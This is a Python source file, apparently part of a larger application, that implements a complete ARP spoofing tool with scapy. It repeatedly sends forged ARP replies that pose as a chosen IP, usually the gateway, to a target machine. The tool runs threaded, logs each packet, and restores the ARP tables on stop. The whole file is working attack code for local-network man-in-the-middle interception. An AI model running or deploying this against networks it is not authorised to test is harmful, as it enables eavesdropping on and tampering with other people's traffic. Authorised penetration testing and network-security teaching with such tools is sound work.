import threading
import time
from datetime import datetime
from typing import List, Dict, Any, Callable, Optional

from scapy.all import ARP, send, getmacbyip

from app.utils.logger import get_logger
from app.utils.config import get_config

# Module logger
logger = get_logger('components.arp_spoofer')

class ARPSpoofer:
    def __init__(self):
        self.running = False
        self.spoof_thread = None
        self.packets_sent = 0
        self.target_ip = None
        self.spoof_as_ip = None
        self.config = get_config()
        self.interval = self.config.get("spoofer.packet_interval", 1.0)
        self.packet_history = []
        self.max_history = self.config.get("spoofer.max_packets", 100)
        
        # Callback for external components (like packet display)
        self.packet_callback = None
        
    def start_spoofing(self, target_ip: str, spoof_as_ip: str, 
                      interval: float = None, callback: Optional[Callable] = None,
                      packet_callback: Optional[Callable] = None):
        """Start ARP spoofing attack.
        
        Args:
            target_ip: IP address of the target device
            spoof_as_ip: IP address to spoof as (typically the gateway)
            interval: Time between packets in seconds
            callback: Callback function for status updates
            packet_callback: Callback function for packet events
        
        Returns:
            bool: True if spoofing started successfully, False otherwise
        """
        if self.running:
            logger.warning("ARP spoofing already in progress")
            return False
            
        self.target_ip = target_ip
        self.spoof_as_ip = spoof_as_ip
        self.packets_sent = 0
        self.packet_history = []
        
        # Use provided interval or default from config
        if interval is not None:
            self.interval = interval
            
        self.packet_callback = packet_callback
        self.running = True
        
        logger.info(f"Starting ARP spoofing: {target_ip} as {spoof_as_ip} (interval: {self.interval}s)")
        
        # Start spoofing in a separate thread
        self.spoof_thread = threading.Thread(
            target=self._spoof_thread,
            args=(target_ip, spoof_as_ip, self.interval, callback)
        )
        self.spoof_thread.daemon = True
        self.spoof_thread.start()
        
        return True
        
    def stop_spoofing(self, restore: bool = True):
        """Stop ARP spoofing attack.
        
        Args:
            restore: Whether to restore ARP tables
            
        Returns:
            bool: True if stopped successfully, False otherwise
        """
        if not self.running:
            logger.warning("No ARP spoofing in progress")
            return False
            
        logger.info("Stopping ARP spoofing")
        self.running = False
        
        # Wait for the thread to terminate
        if self.spoof_thread:
            self.spoof_thread.join(timeout=2.0)
            
        # Restore ARP tables if requested
        if restore and self.target_ip and self.spoof_as_ip:
            try:
                self._restore_arp(self.target_ip, self.spoof_as_ip)
            except Exception as e:
                logger.error(f"Failed to restore ARP tables: {e}")
                
        return True
        
    def _spoof_thread(self, target_ip: str, spoof_as_ip: str, interval: float, callback: Optional[Callable]):
        """Thread function to perform the actual ARP spoofing.
        
        Args:
            target_ip: IP address of the target device
            spoof_as_ip: IP address to spoof as
            interval: Time between packets in seconds
            callback: Callback function for status updates
        """
        try:
            # Get the real MAC address of the target
            target_mac = getmacbyip(target_ip)
            if not target_mac:
                error_msg = f"Failed to get MAC address for {target_ip}"
                logger.error(error_msg)
                if callback:
                    callback(False, error_msg)
                return
            
            logger.info(f"Target MAC address: {target_mac}")
                
            # Start sending spoofed ARP replies
            while self.running:
                packet_time = datetime.now()
                packet_info = self._send_arp_spoof(target_ip, target_mac, spoof_as_ip, packet_time)
                self.packets_sent += 1
                
                # Add to packet history
                if packet_info:
                    self.packet_history.append(packet_info)
                    # Limit packet history size
                    if len(self.packet_history) > self.max_history:
                        self.packet_history = self.packet_history[-self.max_history:]
                    
                    # Notify via callback
                    if self.packet_callback:
                        self.packet_callback(packet_info)
                
                # Status update
                status_msg = f"Sent {self.packets_sent} ARP packets"
                if callback:
                    callback(True, status_msg)
                    
                # Sleep for the specified interval
                time.sleep(interval)
                
        except Exception as e:
            error_msg = f"Spoofing error: {str(e)}"
            logger.error(error_msg)
            if callback:
                callback(False, error_msg)
                
        finally:
            self.running = False
            
    def _send_arp_spoof(self, target_ip: str, target_mac: str, spoof_as_ip: str, 
                       packet_time: Optional[datetime] = None) -> Dict[str, Any]:
        """Send a spoofed ARP packet.
        
        Args:
            target_ip: IP address of the target
            target_mac: MAC address of the target
            spoof_as_ip: IP to spoof as
            packet_time: Timestamp for the packet
            
        Returns:
            dict: Packet information for logging and display
        """
        try:
            # Create a spoofed ARP packet
            arp_packet = ARP(
                op=2,  # ARP reply
                pdst=target_ip,  # Target IP
                hwdst=target_mac,  # Target MAC
                psrc=spoof_as_ip  # Spoofed source IP (usually the gateway)
            )
            
            # Send the packet
            send(arp_packet, verbose=0)
            
            # Return packet info for tracking
            return {
                'time': packet_time or datetime.now(),
                'src': spoof_as_ip,
                'dst': target_ip,
                'type': 'ARP',
                'info': f"ARP Reply {spoof_as_ip} is-at {arp_packet.hwsrc}",
                'direction': 'sent',
                'raw_packet': arp_packet
            }
            
        except Exception as e:
            logger.error(f"Error sending ARP packet: {e}")
            return None
        
    def _restore_arp(self, target_ip: str, gateway_ip: str):
        """Restore the ARP tables to their normal state.
        
        Args:
            target_ip: IP address of the target
            gateway_ip: IP address of the gateway
        """
        try:
            # Get real MAC addresses
            target_mac = getmacbyip(target_ip)
            gateway_mac = getmacbyip(gateway_ip)
            
            if target_mac and gateway_mac:
                logger.info(f"Restoring ARP tables: {gateway_ip} ({gateway_mac}) -> {target_ip} ({target_mac})")
                
                # Create and send ARP packet with real values
                arp_packet = ARP(
                    op=2,  # ARP reply
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=gateway_ip,
                    hwsrc=gateway_mac
                )
                
                # Send multiple times to ensure restoration
                for _ in range(5):
                    send(arp_packet, verbose=0)
                    time.sleep(0.1)
                    
                # Add to packet history
                packet_info = {
                    'time': datetime.now(),
                    'src': gateway_ip,
                    'dst': target_ip,
                    'type': 'ARP',
                    'info': f"ARP Restore: {gateway_ip} is-at {gateway_mac}",
                    'direction': 'sent',
                    'raw_packet': arp_packet
                }
                
                self.packet_history.append(packet_info)
                if self.packet_callback:
                    self.packet_callback(packet_info)
                    
        except Exception as e:
            logger.error(f"Error restoring ARP tables: {e}")
            
    def get_packet_history(self) -> List[Dict[str, Any]]:
        """Get the packet history.
        
        Returns:
            list: List of packet information dictionaries
        """
        return self.packet_history.copy() 